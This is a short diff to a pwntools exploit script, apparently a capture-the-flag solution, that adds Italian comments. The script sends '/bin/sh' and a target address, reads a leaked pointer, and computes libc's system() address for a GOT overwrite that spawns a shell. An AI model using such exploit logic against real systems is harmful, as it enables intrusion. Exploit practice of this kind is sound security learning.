@@ -44,10 +44,10 @@ addr = b"0x404018"
 change = b"0x404000"
 io = start()
 
-io.sendlineafter(b"> ", b"/bin/sh")
-io.sendlineafter(b"> ", addr)
+io.sendlineafter(b"> ", b"/bin/sh") # name
+io.sendlineafter(b"> ", addr) #indirizzo dove sovrascrivere
 tochange = int(io.recvline().decode().strip().split(" ")[-1], 16)
-addr = tochange - pos[0] + syste[0]
+addr = tochange - pos[0] + syste[0] # base address del libc direttamente system
 print(tochange)
 print(hex(addr).encode())
 print(io.recvline())
